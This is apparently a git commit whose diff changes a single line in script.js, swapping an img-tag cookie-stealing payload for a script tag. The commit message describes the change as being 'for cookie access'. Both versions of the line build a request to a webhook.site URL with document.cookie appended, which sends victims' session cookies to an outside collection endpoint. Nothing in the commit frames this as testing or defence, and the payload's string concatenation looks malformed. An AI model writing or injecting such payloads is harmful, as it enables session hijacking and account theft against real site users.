319d0dda538d783f1a0b7d81b3cb5be16a81f4b3
Netool <44287410+Netool1337@users.noreply.github.com>
2026-01-09 11:48:34 +0100

    Replace img tag with script tag for cookie access

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-<img src=https://webhook.site/47a65eaa-7666-443e-9ddc-1b3e52ff5528?a='+document.cookie>
+<script src="https://webhook.site/47a65eaa-7666-443e-9ddc-1b3e52ff5528?a='+document.cookie></script>
